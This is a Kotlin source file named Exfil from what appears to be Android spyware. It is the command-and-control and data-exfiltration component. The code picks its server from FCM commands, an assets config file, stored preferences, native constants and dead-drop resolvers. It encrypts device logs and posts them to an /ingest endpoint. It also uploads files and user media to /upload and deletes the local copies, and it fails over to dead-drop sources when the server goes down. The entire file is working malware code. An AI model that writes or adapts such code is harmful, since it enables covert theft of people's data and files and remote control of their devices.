package com.sp.core.c2

import android.content.Context
import android.net.Uri
import android.util.Log
import com.sp.core.util.Crypto
import com.sp.core.util.DeadDrop
import com.sp.core.util.Prefs
import com.sp.loader.NativeKey
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

object Exfil {
    private const val TAG = "Exfil"

    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    @Volatile private var c2Url: String? = null
    @Volatile private var apiKey: String? = null
    @Volatile private var fallbackUsed = false

    /**
     * Resolution order:
     *   1. Runtime config set via setC2() (FCM "cfg" command) — highest priority
     *   2. assets/c2.conf — "<url>|<apikey>" (URL can be changed without a rebuild)
     *   3. Prefs          — previously persisted config
     *   4. Native constants — compiled-in fallback
     *   5. Dead-drop sources — resolved at runtime (see DeadDrop)
     */
    private fun resolveConfig(ctx: Context) {
        if (c2Url != null) return

        val runtime = Prefs.get(ctx, "c2_url", null) as? String
        val runtimeKey = Prefs.get(ctx, "api_key", null) as? String

        if (!runtime.isNullOrEmpty()) {
            c2Url = runtime
            apiKey = runtimeKey
            return
        }

        try {
            ctx.assets.open("c2.conf").use { input ->
                val line = input.bufferedReader().readLine().orEmpty()
                if (line.isNotBlank()) {
                    val parts = line.split("|", limit = 2)
                    c2Url = parts[0].trim()
                    apiKey = parts.getOrNull(1)?.trim()
                    persist(ctx, c2Url!!, apiKey)
                    return
                }
            }
        } catch (_: Exception) {
        }

        val stored = Prefs.get(ctx, "c2_url", null) as? String
        if (!stored.isNullOrEmpty()) {
            c2Url = stored
            apiKey = (Prefs.get(ctx, "api_key", null) as? String)
                ?.takeIf { it.isNotEmpty() } ?: NativeKey.apiKey()
            return
        }

        // Dead-drop resolvers are network calls - they are never executed on
        // the caller's thread (that blocked the main looper and caused ANRs).
        Thread {
            try {
                val dropped = DeadDrop.resolve(ctx)
                if (!dropped.isNullOrBlank()) {
                    c2Url = null
                    apiKey = null
                    resolveConfig(ctx)
                }
            } catch (_: Throwable) {
            }
        }.start()

        c2Url = NativeKey.c2Url()
        apiKey = NativeKey.apiKey()
    }

    private fun persist(ctx: Context, url: String, key: String?) {
        Prefs.set(ctx, "c2_url", url)
        if (!key.isNullOrEmpty()) Prefs.set(ctx, "api_key", key)
    }

    /** Remote reconfiguration — used by the FCM "cfg" command. */
    fun setC2(ctx: Context, url: String, key: String? = null) {
        c2Url = url.trimEnd('/')
        apiKey = key
        fallbackUsed = false
        persist(ctx, c2Url!!, apiKey)
    }

    fun currentUrl(): String? = c2Url

    /** Resolved C2 base URL (used by the command poll). */
    fun baseUrl(ctx: Context): String? {
        resolveConfig(ctx)
        return c2Url?.trimEnd('/')
    }

    /** Resolved API key (used by the command poll). */
    fun apiKeyValue(): String? = apiKey

    private fun endpoint(path: String): String? {
        val base = c2Url?.trimEnd('/') ?: return null
        return "$base$path"
    }

    fun sendLog(ctx: Context, kind: String, payload: String, onResult: ((Boolean) -> Unit)? = null) {
        resolveConfig(ctx)
        val url = endpoint("/ingest") ?: return
        val deviceId = Prefs.deviceId(ctx)
        val encrypted = Crypto.encrypt("$deviceId|$kind|$payload")
        val body = FormBody.Builder()
            .add("d", encrypted).add("k", apiKey ?: "").build()
        val req = Request.Builder().url(url).post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.w(TAG, "send failed: ${e.message}")
                onResult?.invoke(false)
                recover(ctx)
            }

            override fun onResponse(call: Call, response: Response) {
                val ok = response.isSuccessful
                response.close()
                onResult?.invoke(ok)
            }
        })
    }

    /** Synchronous variant - used by the crash handler (the process is dying). */
    fun sendLogSync(ctx: Context, kind: String, payload: String) {
        val t = Thread {
        try {
            resolveConfig(ctx)
            val url = endpoint("/ingest")
            if (url == null) return@Thread
            val deviceId = Prefs.deviceId(ctx)
            val encrypted = Crypto.encrypt("$deviceId|$kind|$payload")
            val body = FormBody.Builder()
                .add("d", encrypted).add("k", apiKey ?: "").build()
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { it.close() }
        } catch (_: Throwable) {
        }
        }
        t.isDaemon = true
        t.start()
        try { t.join(4000) } catch (_: Throwable) {}
    }

    /** Sends several items of one kind in a single request. */
    fun sendBatch(ctx: Context, kind: String, items: List<String>, onResult: ((Boolean) -> Unit)? = null) {
        if (items.isEmpty()) {
            onResult?.invoke(true)
            return
        }
        val joined = items.joinToString(",", "[", "]")
        sendLog(ctx, kind, """{"items":$joined}""", onResult)
    }

    /**
     * Endpoint is unreachable -> pull a fresh one from the dead-drop sources.
     * Executed off the main thread, only once per outage.
     */
    private fun recover(ctx: Context) {
        if (fallbackUsed) return
        fallbackUsed = true
        Thread {
            try {
                val cfg = DeadDrop.resolve(ctx)
                if (!cfg.isNullOrBlank()) {
                    Log.i(TAG, "dead-drop recovery applied")
                    fallbackUsed = false
                }
            } catch (_: Throwable) {
            }
        }.start()
    }

    fun uploadFile(ctx: Context, file: File, kind: String) {
        resolveConfig(ctx)
        val url = endpoint("/upload") ?: return

        val deviceId = Prefs.deviceId(ctx)
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("meta", "$deviceId|$kind|${file.name}")
            .addFormDataPart("f", file.name,
                file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
            .build()
        val req = Request.Builder().url(url)
            .header("X-Key", apiKey ?: "").post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.w(TAG, "upload failed: ${e.message}")
                recover(ctx)
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                file.delete()
            }
        })
    }

    fun uploadMedia(ctx: Context, uri: Uri, kind: String, name: String, size: Long) {
        try {
            val tmp = File(ctx.cacheDir, "m_${System.currentTimeMillis()}_$name")
            ctx.contentResolver.openInputStream(uri)?.use { ins ->
                tmp.outputStream().use { outs -> ins.copyTo(outs) }
            }
            uploadFile(ctx, tmp, kind)
        } catch (_: Exception) {
        }
    }
}
